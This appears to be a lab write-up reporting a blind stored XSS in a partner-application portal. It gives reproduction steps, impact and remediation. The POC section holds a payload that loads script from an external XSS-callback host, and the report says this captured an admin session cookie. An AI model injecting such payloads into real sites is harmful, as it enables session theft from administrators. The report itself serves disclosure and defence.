## Title
Blind XSS - PartnerHub Partner Portal

## Description
A Blind Stored Cross-Site Scripting (XSS) vulnerability was identified in the PartnerHub partner application portal. The application accepts user-controlled input in fields such as Company Name, Country / Region, and Full Name without safely handling the submitted HTML/JavaScript content.

A crafted XSS payload was submitted through the partner application form. The submitted data was stored and later rendered in the administrative interface. When the administrator accessed the affected application details, the injected JavaScript executed and generated an external callback to the attacker's XSS reporting endpoint.

**Affected URL:** https://partnerhub.pwnedbox.site/

## Steps to Reproduce
1. Open the PartnerHub partner application page: `https://partnerhub.pwnedbox.site/apply.php?type=reseller`.
2. Enter the XSS payload in the Company Name, Country / Region, and Full Name fields.
3. Complete the required fields and submit the application.
4. Log in to the administrative dashboard and locate the submitted application.
5. Open the application details and check the XSS reporting dashboard for the callback.

## POC (Proof of Concept)
**Lab Address:** https://partnerhub.pwnedbox.site/

**Affected functionality:** Partner application submission and administrative application details.

**Injection points:** Company Name, Country / Region, and Full Name.

**Payload:**
```html
"><ScRipt src=https://xss.report/c/mihir></Script>
```

**Observed Result:**

- The application was successfully submitted, and the confirmation page displayed the submitted payload in the response.
- The application appeared in the administrative dashboard with the submitted input.
- Opening the application details generated a callback to the configured `xss.report` endpoint.
- The XSS reporting dashboard recorded the affected administrative page URL: `https://partnerhub.pwnedbox.site/admin/view.php?id=2`.
- The report details showed a captured `PHPSESSID` cookie. This demonstrates that the injected script could access cookie data in the execution context; actual session takeover was not demonstrated.

**Screenshot Evidence:**
1. Partner application form showing the injected payload in the submitted fields.
<img width="1919" height="973" alt="image" src="https://github.com/user-attachments/assets/64b21ecd-81ec-4671-b45c-ad157ded3b8c" />

2. Application confirmation page showing the submitted payload and application number `PH-2094389C`.
<img width="1919" height="978" alt="image" src="https://github.com/user-attachments/assets/05e8fd6f-cc8b-4af5-9110-40e5c60030d2" />

3. Administrative dashboard showing the submitted application.
<img width="1919" height="970" alt="image" src="https://github.com/user-attachments/assets/01cb5ce7-aed8-44a4-8df5-6b41c530853f" />

4. Administrative application details page showing the stored input.
<img width="1919" height="974" alt="image" src="https://github.com/user-attachments/assets/86c311bd-7478-409c-98bb-4d2aea69acac" />

5. XSS reporting dashboard showing the callback activity.
<img width="1919" height="982" alt="image" src="https://github.com/user-attachments/assets/b719b760-6541-4b5e-aa0c-1e84354d67b5" />

6. XSS report details showing the affected admin URL, referrer, and captured cookie information.
<img width="1919" height="987" alt="image" src="https://github.com/user-attachments/assets/dbdf1ce7-005b-4847-86b8-ac7509e40c6d" />


## Impact
An attacker could submit a malicious application containing JavaScript that executes when an administrator views the stored application.

Potential consequences include:
- **Administrative session exposure:** JavaScript may access session cookies when they are not protected by the `HttpOnly` attribute.
- **Unauthorized actions:** Malicious scripts may perform actions within the administrator's authenticated session, subject to application protections.
- **Sensitive information exposure:** Data accessible to the administrator's browser may be exposed to an attacker.
- **Administrative interface manipulation:** The injected script may modify page content or present deceptive information.

## Remediation
1. Apply context-aware output encoding to all user-controlled values before rendering them in the administrative interface.
2. Treat all submitted application fields as untrusted input and prevent raw HTML or JavaScript execution.
3. Use secure templating practices and avoid inserting user-controlled values directly into HTML.
4. Set session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
5. Implement a restrictive Content Security Policy (CSP) to reduce the impact of script injection.
6. Review existing stored application records and safely handle any previously submitted malicious content.
